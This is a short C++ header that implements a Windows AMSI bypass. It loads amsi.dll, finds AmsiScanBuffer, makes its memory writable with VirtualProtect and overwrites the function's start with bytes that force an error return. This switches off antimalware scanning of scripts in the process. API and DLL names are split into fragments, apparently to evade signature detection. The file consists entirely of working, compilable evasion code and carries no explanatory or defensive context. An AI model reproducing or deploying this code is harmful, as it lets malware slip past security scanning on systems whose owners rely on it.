#include <windows.h>
#include <libloaderapi.h>
#include <memoryapi.h>
#include <vector>
#include <algorithm>

#ifndef _K32_H
#define _K32_H

typedef HMODULE (WINAPI *FP)(LPCSTR n);
typedef FARPROC (WINAPI *GA)(HMODULE h,LPCSTR n);
typedef BOOL (WINAPI *VPR)(LPVOID la,SIZE_T ds,DWORD fat,PDWORD fp);

struct k32 {
    HINSTANCE lib;
    GA GPA;
    FP LL;
    VPR VP;

    k32(): lib(LoadLibraryA("Kernel""32.dll")){
            ld();
    }

    int ld(){
        GPA = (GA)GetProcAddress(lib,"Get""Proc""Address");
        LL = (FP)GetProcAddress(lib,"Lo""ad""Lib""raryA");
        VP = (VPR)GetProcAddress(lib,"Vi""rtu""al""Pro""tect");
        return 0;
    }
};

class am {
   k32 k;
   HINSTANCE lib;
   FARPROC asb;

public:
    am():lib(k.LL("am""si.dll")){
        asb = k.GPA(lib,"Amsi""Scan""Buffer");
        pt();
    }
    int pt(){
        std::vector<unsigned char> bytes { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        DWORD old = 0x0;
        k.VP((LPVOID)asb,0x10,0x40,&old);
        char *p = (char *)asb;
        printf("Before\n");
        for(char *n=p;n<p+6;n++){
            printf(" %08x |",*n);
        }
        printf("\n");
        std::copy(bytes.begin(),bytes.end(),p);

        printf("After\n");
        for(char *n=p;n<p+6;n++){
            printf(" %08x |",*n);
        }
        printf("\n");
        return 0;
    }
};

#endif //_K32_H
